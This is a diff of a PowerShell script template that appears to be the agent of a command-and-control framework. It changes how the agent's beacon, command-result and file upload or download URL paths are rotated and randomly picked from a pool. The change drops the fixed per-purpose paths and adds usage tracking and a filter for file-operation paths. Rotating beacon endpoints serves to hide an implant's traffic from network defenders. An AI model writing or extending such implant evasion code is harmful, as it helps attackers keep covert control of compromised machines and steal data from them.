@@ -4,19 +4,8 @@ $global:currentRotationId = {{ROTATION_ID}}
 $global:nextRotationTime = {{NEXT_ROTATION_TIME}}
 $global:rotationInterval = {{ROTATION_INTERVAL}}
 
-# Store initial paths
-$global:initialPaths = @{
-    "beacon_path" = "{{BEACON_PATH}}";
-    "cmd_result_path" = "{{CMD_RESULT_PATH}}";
-    "file_request_path" = "{{FILE_REQUEST_PATH}}";
-    "file_upload_path" = "{{FILE_UPLOAD_PATH}}";
-}
-
-# Store path pool for modular operation
+# Store the path pool for modular operation
 $global:pathPool = @()
-
-# Store current paths
-$global:currentPaths = $global:initialPaths.Clone()
 
 # Track which paths have been used and how many times
 $global:pathUsageTracking = @{}
@@ -34,29 +23,22 @@ function Update-PathRotation {
     
     # Update paths if provided
     if ($Paths -and $Paths.Count -gt 0) {
-        $global:currentPaths = @{}
         $global:pathPool = @()
         $global:pathUsageTracking = @{} # Reset usage tracking on rotation
         
-        foreach ($key in $Paths.Keys) {
-            if ($key -eq "beacon_path" -or $key -eq "cmd_result_path" -or $key -eq "file_request_path" -or $key -eq "file_upload_path") {
-                $global:currentPaths[$key] = $Paths[$key]
-                Write-Host "Updated path $key to: $($Paths[$key])"
+        # Store the path pool for random selection
+        if ($Paths.ContainsKey("path_pool")) {
+            if ($Paths["path_pool"] -is [array]) {
+                $global:pathPool = $Paths["path_pool"]
+                Write-Host "Updated path pool with $($global:pathPool.Count) paths"
+                
+                # Initialize usage tracking for each path
+                foreach ($path in $global:pathPool) {
+                    $global:pathUsageTracking[$path] = 0
+                }
             }
-            elseif ($key -eq "path_pool") {
-                # Store the path pool for random selection
-                if ($Paths[$key] -is [array]) {
-                    $global:pathPool = $Paths[$key]
-                    Write-Host "Updated path pool with $($global:pathPool.Count) paths"
-                    
-                    # Initialize usage tracking for each path
-                    foreach ($path in $global:pathPool) {
-                        $global:pathUsageTracking[$path] = 0
-                    }
-                }
-                else {
-                    Write-Host "Warning: path_pool is not an array, skipping"
-                }
+            else {
+                Write-Host "Warning: path_pool is not an array, skipping"
             }
         }
     }
@@ -71,14 +53,34 @@ function Get-RandomPath {
     [CmdletBinding()]
     param(
         [switch]$ForceRandom = $false,
-        [switch]$PreferUnused = $true
+        [switch]$PreferUnused = $true,
+        [switch]$ForFileOperation = $false
     )
     
     # Check if we have a path pool to use
     if (-not $global:pathPool -or $global:pathPool.Count -eq 0) {
-        # If no path pool available, return beacon path as fallback
-        Write-Verbose "No path pool available, using beacon_path as fallback"
-        return Get-CurrentPath -PathType "beacon_path"
+        # If no path pool available, return a fallback path
+        Write-Verbose "No path pool available, using fallback path"
+        return "/api/endpoint"
+    }
+    
+    # If looking for a file operation path, try to select one that matches
+    if ($ForFileOperation) {
+        $fileOpPaths = $global:pathPool | Where-Object { $_ -match "/file/" -or $_ -match "/download/" -or $_ -match "/content/" }
+        if ($fileOpPaths -and $fileOpPaths.Count -gt 0) {
+            # Use one of these paths
+            $randomIndex = Get-Random -Minimum 0 -Maximum $fileOpPaths.Count
+            $path = $fileOpPaths[$randomIndex]
+            Write-Verbose "Selected file operation path: $path"
+            
+            # Update usage tracking
+            if (-not $global:pathUsageTracking.ContainsKey($path)) {
+                $global:pathUsageTracking[$path] = 0
+            }
+            $global:pathUsageTracking[$path]++
+            
+            return $path
+        }
     }
     
     # If we need completely random selection, bypass usage tracking
@@ -167,34 +169,6 @@ function Get-RandomPath {
     $global:pathUsageTracking[$path]++
     Write-Verbose "Fallback random path selection: $path"
     return $path
-}
-
-# Function to get the current path by type
-function Get-CurrentPath {
-    param([string]$PathType)
-    
-    # First look in current paths (rotated)
-    if ($global:currentPaths.ContainsKey($PathType)) {
-        $path = $global:currentPaths[$PathType]
-        if (-not [string]::IsNullOrEmpty($path)) {
-            Write-Verbose "Using current path for ${PathType}: $path"
-            return $path
-        }
-    }
-    
-    # Then try initial paths
-    if ($global:initialPaths.ContainsKey($PathType)) {
-        $path = $global:initialPaths[$PathType]
-        if (-not [string]::IsNullOrEmpty($path)) {
-            Write-Verbose "Using initial path for ${PathType}: $path"
-            return $path
-        }
-    }
-    
-    # If we get here, we don't have a valid path - throw error instead of using fallbacks
-    $errorMsg = "ERROR: No valid path found for '${PathType}'. Dynamic path rotation requires all paths."
-    Write-Host $errorMsg
-    throw $errorMsg
 }
 
 # Function to check if rotation is needed
